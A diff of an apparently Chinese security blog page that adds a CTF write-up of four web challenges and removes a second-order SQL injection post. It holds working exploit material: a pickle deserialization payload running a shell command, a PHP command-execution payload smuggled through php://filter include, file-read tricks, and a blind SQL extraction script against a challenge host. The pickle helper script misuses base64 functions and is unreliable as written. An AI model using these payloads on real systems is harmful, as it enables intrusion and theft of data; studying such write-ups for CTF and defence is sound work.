@@ -172,6 +172,86 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-强网拟态部分web" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/10/26/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E9%83%A8%E5%88%86web/" class="article-date">
+  	<time datetime="2021-10-25T16:00:00.000Z" itemprop="datePublished">2021-10-26</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/10/26/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E9%83%A8%E5%88%86web/">
+        强网拟态部分web
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="zerocalc"><a href="#zerocalc" class="headerlink" title="zerocalc"></a>zerocalc</h1><p>打开页面，发现是readFile(“./src/index.js”)，发现出现nodejs语言，本来打算审计的，但是发现readFile可以读文件，所以直接构造readFile(“/flag”)就可以看见flag了，提示都是骗人的</p>
+<h1 id="ezPickle"><a href="#ezPickle" class="headerlink" title="ezPickle"></a>ezPickle</h1><p>打开页面，发现只有一个Hello，但是可以下载附件，所以可以看见两个文件的代码</p>
+<p>app.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request, session, render_template_string, url_for,redirect</span><br><span class="line">import pickle</span><br><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line">import random</span><br><span class="line">import subprocess</span><br><span class="line">from config import notadmin</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">class RestrictedUnpickler(pickle.Unpickler):</span><br><span class="line">    def find_class(self, module, name):</span><br><span class="line">        if module in [&#x27;config&#x27;] and &quot;__&quot; not in name:</span><br><span class="line">            return getattr(sys.modules[module], name)</span><br><span class="line">        raise pickle.UnpicklingError(&quot;&#x27;%s.%s&#x27; not allowed&quot; % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def restricted_loads(s):</span><br><span class="line">    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span><br><span class="line">    return RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    info = request.args.get(&#x27;name&#x27;, &#x27;&#x27;)</span><br><span class="line">    if info is not &#x27;&#x27;:</span><br><span class="line">        x = base64.b64decode(info)</span><br><span class="line">        User = restricted_loads(x)</span><br><span class="line">    return render_template_string(&#x27;Hello&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, debug=True, port=5000)</span><br></pre></td></tr></table></figure>
+
+<p>config.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">notadmin=&#123;&quot;admin&quot;:&quot;no&quot;&#125;</span><br><span class="line"></span><br><span class="line">def backdoor(cmd):</span><br><span class="line">    if notadmin[&quot;admin&quot;]==&quot;yes&quot;:</span><br><span class="line">        s=&#x27;&#x27;.join(cmd)</span><br><span class="line">        eval(s)</span><br></pre></td></tr></table></figure>
+<p>通过对两个文件的审计，思路是首先get提交一个name参数，然后便对其进行base64的解码，并放入restricted_loads这个函数中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">info = request.args.get(&#x27;name&#x27;, &#x27;&#x27;)</span><br><span class="line">if info is not &#x27;&#x27;:</span><br><span class="line">    x = base64.b64decode(info)</span><br><span class="line">    User = restricted_loads(x)</span><br></pre></td></tr></table></figure>
+
+<p>然后将其转换为字节流，并放入到RestrictedUnpickler函数中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def restricted_loads(s):</span><br><span class="line">    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span><br><span class="line">    return RestrictedUnpickler(io.BytesIO(s)).load()</span><br></pre></td></tr></table></figure>
+<p>然后只要满足这个if就可以，使用config.py中的eval(s)，执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if module in [&#x27;config&#x27;] and &quot;__&quot; not in name:</span><br><span class="line">    return getattr(sys.modules[module], name)</span><br></pre></td></tr></table></figure>
+<p>但是发现如果要绕过if，需要notadmin[“admin”]==”yes”，但是这里固定了notadmin={“admin”:”no”}，所以我们需要通过python反序列化伪造admin为yes，所以exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import pickle</span><br><span class="line">import pickletools</span><br><span class="line">import base64</span><br><span class="line">import config</span><br><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">class RestrictedUnpickler(pickle.Unpickler):</span><br><span class="line">    def find_class(self, module, name):</span><br><span class="line">        if module in [&#x27;config&#x27;] and &quot;__&quot; not in name:</span><br><span class="line">            return getattr(sys.modules[module], name)</span><br><span class="line">        raise pickle.UnpicklingError(&quot;&#x27;%s.%s&#x27; not allowed&quot; % (module, name))</span><br><span class="line"></span><br><span class="line">data=b&#x27;&#x27;&#x27;cconfig</span><br><span class="line">notadmin</span><br><span class="line">(S&#x27;admin&#x27;</span><br><span class="line">S&#x27;yes&#x27;</span><br><span class="line">u0(cconfig</span><br><span class="line">backdoor</span><br><span class="line">(S&#x27;exec(&quot;import os;os.system(&#x27;curl &#x27;);&quot;)&#x27;</span><br><span class="line">Io.&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">data=base64.encode(data)</span><br><span class="line">print(data)</span><br><span class="line">result=RestrictedUnpickler(io.BytesIO(base64.decode(data))).load()</span><br><span class="line">print(config.notadmin)</span><br></pre></td></tr></table></figure>
+<p>即可伪造notadmin[“admin”]==”yes”，然后执行命令，反弹shell</p>
+<h1 id="EasyFilter"><a href="#EasyFilter" class="headerlink" title="EasyFilter"></a>EasyFilter</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   ini_set(&quot;open_basedir&quot;,&quot;./&quot;);</span><br><span class="line">   if(!isset($_GET[&#x27;action&#x27;]))&#123;</span><br><span class="line">       highlight_file(__FILE__);</span><br><span class="line">       die();</span><br><span class="line">   &#125;</span><br><span class="line">   if($_GET[&#x27;action&#x27;] == &#x27;w&#x27;)&#123;</span><br><span class="line">       @mkdir(&quot;./files/&quot;);</span><br><span class="line">       $content = $_GET[&#x27;c&#x27;];</span><br><span class="line">       $file = bin2hex(random_bytes(5));</span><br><span class="line">       file_put_contents(&quot;./files/&quot;.$file,base64_encode($content));</span><br><span class="line">       echo &quot;./files/&quot;.$file;</span><br><span class="line">   &#125;elseif($_GET[&#x27;action&#x27;] == &#x27;r&#x27;)&#123;</span><br><span class="line">       $r = $_GET[&#x27;r&#x27;];</span><br><span class="line">       $file = &quot;./files/&quot;.$r;</span><br><span class="line">       include(&quot;php://filter/resource=$file&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+<p>这道题想了很长时间，没思路，最后发现原来的封装的问题，就是include()里的resource对输入的对象进行封装，然后我们只需要再用base64解码封装即可，所以构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?action=w&amp;c=&lt;?php system(&quot;cat /flag&quot;);?&gt;</span><br><span class="line"></span><br><span class="line">?action=r&amp;r=convert.base64-decode/../62d1ef7ceb</span><br></pre></td></tr></table></figure>
+<p>即可base64解码并通过include函数执行命令</p>
+<h1 id="new-hospital"><a href="#new-hospital" class="headerlink" title="new_hospital"></a>new_hospital</h1><p>其实它是新框架里加入了旧框架，当在/feature.php?id=2目录下是，发现报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">knowledge</span><br><span class="line">Warning: file_get_contents(2.js): failed to open stream: No such file or directory in /var/www/html/feature.php on line 468</span><br></pre></td></tr></table></figure>
+<p>但是报错的函数是file_get_contents()函数，可以利用一下，所以我们通过目录扫描，发现旧框架在/old目录下，所以我们可以构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/old/feature.php</span><br></pre></td></tr></table></figure>
+<p>然后发现输入文件的点在cookie里的API中，所以只要我们构造/var/www/html/flag.php，然后进行base64编码提交即可</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-X-Forwarded-For注入以及盲注加二次注入 " class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1019,78 +1099,6 @@
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-逗号的绕过以及二次注入" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/10/13/%E9%80%97%E5%8F%B7%E7%9A%84%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/" class="article-date">
-  	<time datetime="2021-10-12T16:00:00.000Z" itemprop="datePublished">2021-10-13</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/10/13/%E9%80%97%E5%8F%B7%E7%9A%84%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/">
-        逗号的绕过以及二次注入
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="逗号绕过以及二次注入"><a href="#逗号绕过以及二次注入" class="headerlink" title="逗号绕过以及二次注入"></a>逗号绕过以及二次注入</h1><p>我们打开页面，发现只有一个登录页面，尝试进行sql闭合测试，发现失败，所以用dirsearch扫描目录，发现有</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">register.php、index.php以及login.php</span><br></pre></td></tr></table></figure>
-<p>所以猜测可能是二次注入，即在register.php页面注册，写入sql语句，程序会将它写入存入数据库中，然后在login.php页面登录时会从数据库中刚刚写入的sql语句，并进行读取，然后回显，所以我们可以测试一下，在register.php页面构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username：0&#x27;and &#x27;1</span><br></pre></td></tr></table></figure>
-<p>然后在login.php页面登录后，发现有回显0，所以证明是二次注入，然后经过测试，发现information_schema被过滤，而且逗号也被过滤，所以我们可以使用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;+ascii(substr(database() from 1 for 1))+&#x27;0;</span><br></pre></td></tr></table></figure>
-<p>来绕过逗号，其中+在sql语言中是运算符，而from 1 for 1，意思是在字符串中的第一个位置取出一个字符出来，相当于</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr(database(),1,1))</span><br></pre></td></tr></table></figure>
-<p>而对于information_schema的过滤，我们可以猜测flag在flag表中，所以我们可以构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;+ascii(substr((select * from flag) from 1 for 1))+&#x27;0;</span><br></pre></td></tr></table></figure>
-<p>来读取flag，所以exp</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import logging</span><br><span class="line">import re</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line"># LOG_FORMAT = &quot;%(lineno)d - %(asctime)s - %(levelname)s - %(message)s&quot;</span><br><span class="line"># logging.basicConfig(level=logging.DEBUG, format=LOG_FORMAT)</span><br><span class="line"></span><br><span class="line">def search():</span><br><span class="line">    flag = &#x27;&#x27;</span><br><span class="line">    url = &#x27;http://b52b0533-2f84-4c9b-bd73-e912ab23a59f.node3.buuoj.cn/&#x27;</span><br><span class="line">    url1 = url+&#x27;register.php&#x27;</span><br><span class="line">    url2 = url+&#x27;login.php&#x27;</span><br><span class="line">    for i in range(100):</span><br><span class="line">        sleep(0.3)#不加sleep就429了QAQ</span><br><span class="line">        data1 = &#123;&quot;email&quot; : &quot;1234&#123;&#125;@123.com&quot;.format(i), &quot;username&quot; : &quot;0&#x27;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#x27;0;&quot;.format(i), &quot;password&quot; : &quot;123&quot;&#125;</span><br><span class="line">        data2 = &#123;&quot;email&quot; : &quot;1234&#123;&#125;@123.com&quot;.format(i), &quot;password&quot; : &quot;123&quot;&#125;</span><br><span class="line">        r1 = requests.post(url1, data=data1)</span><br><span class="line">        r2 = requests.post(url2, data=data2)</span><br><span class="line">        res = re.search(r&#x27;&lt;span class=&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;/span&gt;&#x27;,r2.text)</span><br><span class="line">        res1 = re.search(r&#x27;\d+&#x27;, res.group())</span><br><span class="line">        flag = flag+chr(int(res1.group()))</span><br><span class="line">        print(flag)</span><br><span class="line">    print(&quot;final:&quot;+flag)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    search()</span><br></pre></td></tr></table></figure>
-
-
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
 	</div>
 
       
